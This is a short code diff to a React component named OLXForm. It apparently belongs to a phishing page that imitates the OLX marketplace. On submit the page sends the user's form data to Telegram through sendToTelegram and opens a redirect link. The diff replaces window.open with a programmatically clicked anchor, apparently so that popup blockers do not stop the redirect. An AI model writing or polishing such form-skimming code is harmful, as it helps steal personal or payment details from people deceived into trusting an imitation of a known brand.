@@ -45,16 +45,22 @@ export default function OLXForm() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (!validateForm()) {
       return;
     }
 
-    setIsLoading(true);
-
     if (REDIRECT_URL) {
-      window.open(REDIRECT_URL, '_blank', 'noopener,noreferrer');
+      const a = document.createElement('a');
+      a.href = REDIRECT_URL;
+      a.target = '_blank';
+      a.rel = 'noopener noreferrer';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
+
+    setIsLoading(true);
 
     try {
       await sendToTelegram(formData);
